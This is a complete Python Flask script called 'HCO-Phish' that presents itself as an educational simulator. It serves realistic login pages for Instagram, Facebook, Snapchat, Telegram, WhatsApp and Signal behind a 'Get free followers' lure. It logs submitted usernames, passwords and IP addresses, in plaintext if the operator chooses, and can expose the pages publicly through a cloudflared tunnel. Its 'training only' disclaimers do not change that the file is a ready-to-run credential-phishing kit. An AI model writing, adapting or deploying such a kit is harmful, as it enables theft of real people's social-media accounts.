#!/usr/bin/env python3
"""
HCO-Phish.py — Single-file educational simulator (auto cloudflared, realistic pages)

USAGE (Termux):
1) pkg update && pkg install python -y
2) pip install Flask colorama requests
3) (optional) install cloudflared and put it in PATH if you want a public HTTPS link
4) python3 HCO-Phish.py

At startup you must confirm you will only use demo/test accounts. If you decline,
passwords will be hashed instead of saved/displayed.
"""
import os, sys, time, re, hashlib, subprocess, threading, webbrowser
from datetime import datetime
from shutil import which

# check Flask
try:
    from flask import Flask, render_template_string, request
except Exception:
    print("Missing Flask. Install: pip install Flask")
    sys.exit(1)

# optional colorama
try:
    from colorama import init as color_init, Fore, Back, Style
    color_init(autoreset=True)
    USE_COLOR = True
except Exception:
    class _C: pass
    Fore = Back = Style = _C()
    Fore.RED = Fore.GREEN = Fore.YELLOW = Fore.CYAN = Fore.WHITE = ""
    Back.BLUE = ""
    Style.RESET_ALL = ""
    USE_COLOR = False

# ---------------- CONFIG ----------------
APP_HOST = "127.0.0.1"
APP_PORT = 5000
YOUTUBE_LINK = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
CLOUDFLARED_BIN = "cloudflared"
CLOUDFLARED_TIMEOUT = 20  # seconds to wait for public URL
LOGFILE = "simulation_log.txt"
TEMPLATES = ["instagram","facebook","snapchat","telegram","whatsapp","signal"]
# ----------------------------------------

# realistic-ish HTML pages (no copyrighted logos; emoji + CSS)
BASE_INDEX = """<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Welcome</title>
<style>
body{font-family:Inter,Arial,Helvetica;background:#f3f6fb;margin:0;color:#111}
.container{max-width:760px;margin:40px auto;padding:24px;background:white;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.08);text-align:center}
.grid{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:12px}
.btn{padding:12px 18px;border-radius:10px;background:#0b84ff;color:#fff;text-decoration:none;font-weight:700}
.note{color:#666;margin-top:16px;font-size:13px}
.footer{font-size:12px;color:#999;margin-top:20px}
</style></head><body>
<div class="container">
  <h1>HCO-Phish — Simulator</h1>
  <p style="color:#444">Choose a platform to demo the "Get Followers" workflow.</p>
  <div class="grid">
    {% for key,label,icon in items %}
      <a class="btn" href="/simulate/{{key}}">{{icon}} {{label}}</a>
    {% endfor %}
  </div>
  <p class="note">Open the page on your test device (use the Local or Public URL printed in Termux).</p>
  <div class="footer">This page is part of a controlled lab simulation for educational purposes only.</div>
</div>
</body></html>
"""

# Template for simulated login pages — looks realistic
FORM_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{label}}</title>
<style>
body{font-family:Inter,Arial,Helvetica;background:#eef2f7;margin:0;color:#111}
.wrap{max-width:420px;margin:40px auto;padding:18px;background:#fff;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.08)}
.header{display:flex;align-items:center;gap:12px;padding-bottom:8px;border-bottom:1px solid #eee}
.icon{font-size:40px}
.h{font-size:18px;font-weight:700}
.small{color:#666;font-size:13px;margin-top:6px}
.form{padding-top:12px}
select,input{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:1px solid #ddd}
.btn{width:100%;padding:12px;border-radius:8px;border:none;background:#0b84ff;color:white;font-weight:700}
.foot{font-size:12px;color:#999;margin-top:12px;text-align:center}
</style></head><body>
<div class="wrap">
  <div class="header">
    <div class="icon">{{icon}}</div>
    <div>
      <div class="h">{{label}}</div>
      <div class="small">Get free followers — quick demo</div>
    </div>
  </div>
  <div class="form">
    <form action="/submit" method="post">
      <input type="hidden" name="template" value="{{label}}">
      <label>Select followers package</label>
      <select name="followers">
        <option value="100">100</option>
        <option value="1000">1,000</option>
        <option value="10000">10,000</option>
      </select>
      <input name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button class="btn" type="submit">Get Followers</button>
    </form>
  </div>
  <div class="foot">For training only — do not enter real account credentials.</div>
</div>
</body></html>
"""

DONE_HTML = """<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Done</title><style>body{font-family:Inter,Arial;background:#0b1724;color:white;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}.box{background:#b71c34;padding:24px;border-radius:10px;text-align:center}</style></head><body><div class="box"><h1>Submitted</h1><p>Thank you — your selection has been recorded for the simulation.</p><p style="font-size:13px"><a href="/" style="color:#fff">Return</a></p></div></body></html>"""

# ---------------- Flask app ----------------
from flask import Flask, render_template_string, request
app = Flask(__name__)

# helper log functions
def init_log():
    if not os.path.exists(LOGFILE):
        with open(LOGFILE,"w",encoding="utf-8") as f:
            f.write("*** SIMULATION ONLY - DO NOT USE REAL CREDENTIALS ***\n")
            f.write(f"Created: {datetime.utcnow().isoformat()} UTC\n\n")

def save_plain(template, followers, username, password, ip):
    init_log()
    ts = datetime.utcnow().isoformat()
    line = f"[{ts}] {template} | followers={followers} | user={username} | pass={password} | ip={ip}\n"
    with open(LOGFILE,"a",encoding="utf-8") as f: f.write(line)
    print(Fore.YELLOW + "[CAPTURED]" + Style.RESET_ALL, line.strip())

def save_hashed(template, followers, username, password, ip):
    init_log()
    ts = datetime.utcnow().isoformat()
    ph = hashlib.sha256(password.encode("utf-8")).hexdigest()
    line = f"[{ts}] {template} | followers={followers} | user={username} | pass_sha256={ph} | ip={ip}\n"
    with open(LOGFILE,"a",encoding="utf-8") as f: f.write(line)
    print(Fore.CYAN + "[LOGGED]" + Style.RESET_ALL, f"{ts} | {template} | {username} | {ph[:12]}...")

@app.route("/")
def index():
    items = []
    # use emoji icons to make it look familiar
    icon_map = {
        "instagram":"📷","facebook":"📘","snapchat":"👻","telegram":"✈️","whatsapp":"💬","signal":"🔵"
    }
    for k in TEMPLATES:
        items.append((k, k.capitalize(), icon_map.get(k, "🔰")))
    return render_template_string(BASE_INDEX, items=items)

@app.route("/simulate/<name>")
def simulate(name):
    name_l = name.lower()
    if name_l not in TEMPLATES:
        return "Not found", 404
    icon_map = {"instagram":"📷","facebook":"📘","snapchat":"👻","telegram":"✈️","whatsapp":"💬","signal":"🔵"}
    return render_template_string(FORM_HTML, label=name_l.capitalize(), icon=icon_map.get(name_l,"🔰"))

@app.route("/submit", methods=["POST"])
def submit():
    tpl = request.form.get("template","Unknown")
    followers = request.form.get("followers","N/A")
    user = request.form.get("username","")
    pwd = request.form.get("password","")
    ip = request.remote_addr
    if STORE_PLAIN:
        save_plain(tpl, followers, user, pwd, ip)
    else:
        save_hashed(tpl, followers, user, pwd, ip)
    return render_template_string(DONE_HTML)

# --------------- cloudflared helper ---------------
def start_cloudflared_and_get_url(host=APP_HOST, port=APP_PORT, timeout=CLOUDFLARED_TIMEOUT):
    if not which(CLOUDFLARED_BIN):
        print(Fore.YELLOW + "[!]" + Style.RESET_ALL, f"'{CLOUDFLARED_BIN}' not found in PATH. Install cloudflared to auto-create a public URL.")
        return None, None
    cmd = [CLOUDFLARED_BIN, "tunnel", "--url", f"http://{host}:{port}", "--no-autoupdate"]
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except Exception as e:
        print(Fore.RED + "[!]" + Style.RESET_ALL, "Failed to start cloudflared:", e)
        return None, None
    public = None
    start = time.time()
    outbuf = ""
    print(Fore.GREEN + "[*]" + Style.RESET_ALL, "Started cloudflared — waiting for public URL...")
    # read incrementally
    while time.time() - start < timeout:
        if p.poll() is not None:
            break
        try:
            ch = p.stdout.read(1)
            if ch:
                outbuf += ch
                # flush line prints
                if "\n" in outbuf:
                    lines = outbuf.splitlines(True)
                    for ln in lines:
                        if ln.endswith("\n"):
                            print(Fore.MAGENTA + "[cloudflared]" + Style.RESET_ALL, ln.strip())
                    outbuf = ""
                # quick regex search in buffer for trycloudflare link
                m = re.search(r"(https://[^\s\"']+trycloudflare[^\s\"']*)", ch + (p.stdout.read(200) if p.stdout else ""))
                if m:
                    public = m.group(1)
                    break
            else:
                time.sleep(0.1)
        except Exception:
            time.sleep(0.1)
    # try to read remainder
    if not public:
        try:
            rest = p.stdout.read()
            if rest:
                print(rest)
                m2 = re.search(r"(https://[^\s\"']+trycloudflare[^\s\"']*)", rest)
                if m2:
                    public = m2.group(1)
        except Exception:
            pass
    if public:
        print(Fore.GREEN + "[*]" + Style.RESET_ALL, "Detected public URL:", public)
    else:
        print(Fore.YELLOW + "[!]" + Style.RESET_ALL, "Could not auto-detect trycloudflare link. Inspect cloudflared output above.")
    return p, public

# ---------------- URL opener --------------------
def open_url_android(url):
    # try termux-open-url, am start, xdg-open, then webbrowser
    try:
        if which("termux-open-url"):
            subprocess.run(["termux-open-url", url], check=False)
            return True
    except Exception:
        pass
    try:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=False)
        return True
    except Exception:
        pass
    try:
        if which("xdg-open"):
            subprocess.run(["xdg-open", url], check=False)
            return True
    except Exception:
        pass
    try:
        webbrowser.open(url)
        return True
    except Exception:
        return False

# --------------- Terminal UI & run ----------------
def colorful_countdown():
    for i in range(8,0,-1):
        if USE_COLOR:
            print(Fore.RED + f"Unlocking in {i}..." + Style.RESET_ALL)
        else:
            print(f"Unlocking in {i}...")
        time.sleep(1)

def print_banner():
    banner = "╔" + "═"*30 + "╗\n" + "║" + " HCO-Phish by Azhar ".center(30) + "║\n" + "╚" + "═"*30 + "╝"
    if USE_COLOR:
        print(Back.BLUE + Fore.RED + banner + Style.RESET_ALL)
    else:
        print(banner)

STORE_PLAIN = False

def main():
    global STORE_PLAIN
    os.system("clear")
    print("="*60)
    print("HCO-Phish — Educational Simulator (single file)")
    print("="*60)
    print("WARNING: This tool can capture credentials entered on the demo pages.")
    print("Only use test/dummy accounts and devices you own or have permission to test.")
    a = input("Do you want submitted credentials to be shown and saved as PLAINTEXT? (y/N): ").strip().lower()
    if a == "y":
        print(Fore.RED + "*** PLAINTEXT storage enabled. Use responsibly. ***" + Style.RESET_ALL)
        STORE_PLAIN = True
    else:
        print("Credentials will be stored as SHA256 hashes (safer).")
        STORE_PLAIN = False

    input("\nPress ENTER to unlock (this will run a countdown and attempt to open your YouTube channel)...")
    colorful_countdown()
    print("\n[*] Attempting to open your YouTube channel...")
    opened = open_url_android(YOUTUBE_LINK)
    if not opened:
        print(Fore.YELLOW + "[!] Could not open YouTube automatically. Please open this link manually:" + Style.RESET_ALL)
        print(YOUTUBE_LINK)
    input("After returning from YouTube, press ENTER to continue...")

    os.system("clear")
    print_banner()

    print("\nStarting local Flask server...")
    flask_thread = threading.Thread(target=lambda: app.run(host=APP_HOST, port=APP_PORT, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()
    time.sleep(1.0)

    # Ask to automatically start cloudflared
    use_cf = input("Start cloudflared automatically if available to create a public HTTPS link? (y/N): ").strip().lower()
    cf_proc = None
    public_url = None
    if use_cf == "y":
        cf_proc, public_url = start_cloudflared_and_get_url()
    local_url = f"http://{APP_HOST}:{APP_PORT}"
    print("\n--- Access URLs ---")
    print("Local (LAN):", local_url)
    if public_url:
        # ensure simulate path appended
        pub_full = public_url.rstrip("/") + "/simulate/instagram"
        print("Public (copy to your second phone):", pub_full)
    else:
        if cf_proc:
            print(Fore.YELLOW + "[!] cloudflared running but public trycloudflare link not auto-detected. Inspect cloudflared output in this terminal." + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "[!] cloudflared not started. To expose publicly, install cloudflared and run in another termux session:" + Style.RESET_ALL)
            print("    cloudflared tunnel --url http://127.0.0.1:5000")
    print("\nOpen the Local or Public URL on your testing phone and go to /simulate/<platform> (e.g. /simulate/instagram).")
    print("When a form is submitted, the result will appear here and be saved in", LOGFILE)
    print("Press Ctrl+C here to stop the server and cloudflared when finished.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down...")
        if cf_proc:
            try:
                cf_proc.terminate()
            except Exception:
                pass
        sys.exit(0)

if __name__ == "__main__":
    main()
